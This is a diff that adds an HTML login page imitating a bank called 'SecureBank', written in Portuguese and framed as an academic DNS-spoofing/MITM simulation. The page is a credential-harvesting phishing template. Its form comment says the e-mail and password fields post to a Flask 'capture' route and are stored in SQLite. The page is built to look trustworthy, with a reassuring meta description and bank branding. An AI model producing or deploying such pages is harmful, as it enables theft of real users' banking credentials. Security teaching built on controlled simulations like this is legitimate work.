@@ -1,0 +1,116 @@
+<!-- Simulação acadêmica de ataque MITM (DNS Spoofing). Uso exclusivo para fins educacionais em ambiente controlado. -->
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Acesse sua conta SecureBank com segurança. Sistema bancário digital moderno.">
+  <title>SecureBank — Acesso à Conta</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%231a73e8'/><path d='M50 20L25 35v20c0 14 10.7 27.1 25 30 14.3-2.9 25-16 25-30V35L50 20zm0 10l18 11v15c0 10-7.7 19.4-18 21.5V30z' fill='white'/></svg>" type="image/svg+xml">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+  <!-- Page loader -->
+  <div class="page-loader" aria-hidden="true">
+    <div class="loader-spinner"></div>
+  </div>
+
+  <div class="login-page">
+    <div class="login-card">
+
+      <!-- Logo -->
+      <div class="login-logo">
+        <div class="logo-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 2.18l7 3.12v5.7c0 4.83-3.23 9.36-7 10.57V3.18z"/>
+          </svg>
+        </div>
+        <h1>SecureBank</h1>
+        <p>Acesse sua conta com segurança</p>
+      </div>
+
+      <!--
+        Formulário de Login
+        =====================
+        O formulário envia os dados via POST para o endpoint "/login"
+        do servidor Flask. Os campos "usuario" e "senha" serão
+        capturados e armazenados no banco de dados SQLite.
+
+        action="/login"  -> Envia para a rota Flask de captura
+        method="POST"    -> Método HTTP POST (dados no corpo da requisição)
+      -->
+      <form id="loginForm" action="/login" method="POST" novalidate>
+        <!-- Campo de Usuário (E-mail) -->
+        <div class="form-group">
+          <label for="usuario">E-mail</label>
+          <div class="input-wrapper">
+            <input
+              type="email"
+              id="usuario"
+              name="usuario"
+              placeholder="seu@email.com"
+              autocomplete="email"
+              required
+            >
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+              <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+            </svg>
+          </div>
+          <span class="error-message">
+            <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="#ea4335"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            Informe seu e-mail
+          </span>
+        </div>
+
+        <!-- Campo de Senha -->
+        <div class="form-group">
+          <label for="senha">Senha</label>
+          <div class="input-wrapper">
+            <input
+              type="password"
+              id="senha"
+              name="senha"
+              placeholder="••••••••"
+              autocomplete="current-password"
+              required
+            >
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/>
+            </svg>
+          </div>
+          <span class="error-message">
+            <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="#ea4335"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            Informe sua senha
+          </span>
+        </div>
+
+        <!-- Opções extras -->
+        <div class="form-options">
+          <label class="checkbox-label">
+            <input type="checkbox" name="remember" id="remember">
+            Lembrar de mim
+          </label>
+          <a href="#" class="forgot-link" onclick="handleForgotPassword(event)">Esqueci minha senha</a>
+        </div>
+
+        <!-- Botão de Envio -->
+        <button type="submit" class="btn-login" id="loginBtn">
+          <span class="btn-text">Entrar</span>
+          <span class="btn-loader">
+            <span class="dot"></span>
+            <span class="dot"></span>
+            <span class="dot"></span>
+          </span>
+        </button>
+      </form>
+
+      <div class="login-footer">
+        <p>© 2026 SecureBank. Todos os direitos reservados.</p>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
